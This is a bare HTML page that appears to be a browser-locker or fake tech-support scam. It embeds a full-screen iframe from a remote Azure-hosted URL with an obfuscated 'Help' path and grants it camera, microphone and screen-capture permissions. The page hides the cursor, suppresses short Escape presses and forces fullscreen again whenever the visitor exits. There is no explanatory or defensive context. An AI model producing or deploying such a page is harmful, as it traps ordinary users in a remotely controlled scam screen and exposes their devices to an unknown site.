<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title></title>
<style>
  iframe {
    position: fixed;
    width: 100%;
    height: 100%;
    border: none;
    top: 0;
    left: 0;
    cursor: none;
  }
</style>
</head>
<body>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>

<iframe 
  id="f"
  src="https://scholarhorizon-gfgkgncqeza4f3fj.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" 
  allowfullscreen 
  webkitallowfullscreen 
  mozallowfullscreen 
  allow="fullscreen *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *">
</iframe>

<script>
  let pressTimer = null;
  let longPress = false;
  
  function goFullscreen() {
    const docEl = document.documentElement;
    const reqFull = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.msRequestFullscreen;
    if (reqFull) reqFull.call(docEl).catch(() => {});
  }
  
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
      e.preventDefault();
      e.stopPropagation();
      
      pressTimer = setTimeout(function() {
        longPress = true;
        const exitFull = document.exitFullscreen || document.webkitExitFullscreen || document.msExitFullscreen;
        if (exitFull) exitFull.call(document).catch(() => {});
      }, 500);
    }
  });
  
  document.addEventListener('keyup', function(e) {
    if (e.key === 'Escape') {
      if (pressTimer) clearTimeout(pressTimer);
      if (!longPress) goFullscreen();
      longPress = false;
      pressTimer = null;
    }
  });
  
  document.addEventListener('fullscreenchange', function() {
    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
      setTimeout(goFullscreen, 50);
    }
  });
  
  document.addEventListener('webkitfullscreenchange', function() {
    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
      setTimeout(goFullscreen, 50);
    }
  });
  
  goFullscreen();
</script>

</body>
</html>
